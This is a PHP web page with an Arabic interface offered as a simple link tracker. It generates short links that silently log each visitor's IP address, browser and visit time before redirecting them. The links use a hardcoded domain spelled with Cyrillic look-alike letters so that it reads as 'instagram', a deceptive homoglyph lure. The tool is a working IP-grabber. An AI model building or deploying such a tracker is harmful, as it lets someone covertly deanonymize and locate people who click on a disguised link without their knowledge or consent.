<?php
$db = new PDO('sqlite:tracker.db');
$db->exec("CREATE TABLE IF NOT EXISTS links (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, original_url TEXT)");
$db->exec("CREATE TABLE IF NOT EXISTS hits (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ip TEXT, user_agent TEXT, time DATETIME)");

if (isset($_GET['c'])) {
    $code = $_GET['c'];
    $stmt = $db->prepare("SELECT original_url FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $time = date('Y-m-d H:i:s');

        $insert = $db->prepare("INSERT INTO hits (code, ip, user_agent, time) VALUES (?, ?, ?, ?)");
        $insert->execute([$code, $ip, $user_agent, $time]);

        header("Location: " . $link['original_url']);
        exit;
    }
}

$tracking_link = "";
$stats_link = "";

if (isset($_POST['url'])) {
    $original_url = filter_var($_POST['url'], FILTER_SANITIZE_URL);
    $code = substr(md5(mt_rand()), 0, 6);

    $stmt = $db->prepare("INSERT INTO links (code, original_url) VALUES (?, ?)");
    $stmt->execute([$code, $original_url]);

    // يمكنك تغيير اسم الموقع هنا إلى أي اسم تريده مستقبلاً
    $custom_domain = "instаgrаm.onrender.com"; 
    
    $tracking_link = "https://$custom_domain/?c=$code";
    $stats_link = "?stats=$code";
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>أداة تتبع الروابط</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; text-align: center; padding: 40px; }
        .card { background: white; padding: 25px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 90%; max-width: 450px; }
        input[type="text"] { width: 85%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; }
        button { background: #28a745; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .res { background: #e9ecef; padding: 15px; margin-top: 15px; border-radius: 6px; word-break: break-all; }
        table { width: 100%; margin-top: 20px; border-collapse: collapse; font-size: 13px; }
        th, td { border: 1px solid #ddd; padding: 8px; }
        th { background: #f8f9fa; }
    </style>
</head>
<body>

<div class="card">
    <h2>🎯 متتبع الروابط البسيط</h2>
    <form method="POST">
        <input type="text" name="url" placeholder="ضع الرابط الأصلي هنا (https://...)" required>
        <br>
        <button type="submit">إنشاء رابط تتبع</button>
    </form>

    <?php if (!empty($tracking_link)): ?>
        <div class="res">
            <p><strong>رابط التتبع:</strong><br><a href="<?php echo $tracking_link; ?>" target="_blank"><?php echo $tracking_link; ?></a></p>
            <p><a href="<?php echo $stats_link; ?>">📊 اضغط هنا لعرض السجلات</a></p>
        </div>
    <?php endif; ?>

    <?php if (isset($_GET['stats'])): 
        $code = $_GET['stats'];
        $stmt = $db->prepare("SELECT * FROM hits WHERE code = ? ORDER BY id DESC");
        $stmt->execute([$code]);
        $hits = $stmt->fetchAll(PDO::FETCH_ASSOC);
    ?>
        <h3>سجل الزيارات لكود: <?php echo htmlspecialchars($code); ?></h3>
        <?php if (count($hits) > 0): ?>
            <table>
                <tr><th>IP</th><th>الجهاز والمتصفح</th><th>الوقت</th></tr>
                <?php foreach ($hits as $hit): ?>
                <tr>
                    <td><?php echo htmlspecialchars($hit['ip']); ?></td>
                    <td><?php echo htmlspecialchars(substr($hit['user_agent'], 0, 30)); ?>...</td>
                    <td><?php echo htmlspecialchars($hit['time']); ?></td>
                </tr>
                <?php endforeach; ?>
            </table>
        <?php else: ?>
            <p>لا توجد زيارات مسجلة حتى الآن.</p>
        <?php endif; ?>
    <?php endif; ?>
</div>

</body>
</html>
